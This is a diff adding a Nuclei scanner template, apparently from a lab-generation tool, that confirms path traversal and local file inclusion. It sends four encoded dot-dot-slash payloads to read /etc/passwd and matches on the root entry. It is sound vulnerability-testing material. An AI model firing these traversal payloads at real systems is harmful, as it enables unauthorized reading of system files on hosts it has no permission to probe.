@@ -1,0 +1,40 @@
+id: fuzzlab-path-traversal-etc-passwd
+
+info:
+  name: Generic Linux path traversal / LFI via /etc/passwd read
+  author: fuzzlab
+  severity: high
+  description: >
+    Hand-authored fuzzlab lab-generator oracle template (docs/LAB_SEED_AUTHORING_PLAYBOOK.md
+    Addendum E). Confirms a declared, wrapper-supplied (endpoint, parameter) pair is
+    vulnerable to classic dot-dot-slash path traversal / local file inclusion by
+    attempting to read /etc/passwd through it and matching on its well-known first
+    line shape. Lab-only: the caller (fuzzlab.labgen.nuclei_oracle) enforces the
+    loopback-only guard before this template is ever invoked; the template itself
+    carries no target restriction of its own (Nuclei templates cannot express one).
+  tags: fuzzlab,lfi,path-traversal,lab-only
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{endpoint_path}}?{{param_name}}={{payload}}"
+
+    payloads:
+      payload:
+        - "../../../../../../../../etc/passwd"
+        - "../../../../../../../../etc/passwd%00"
+        - "....//....//....//....//....//....//....//....//etc/passwd"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "root:[^:]*:0:0:"
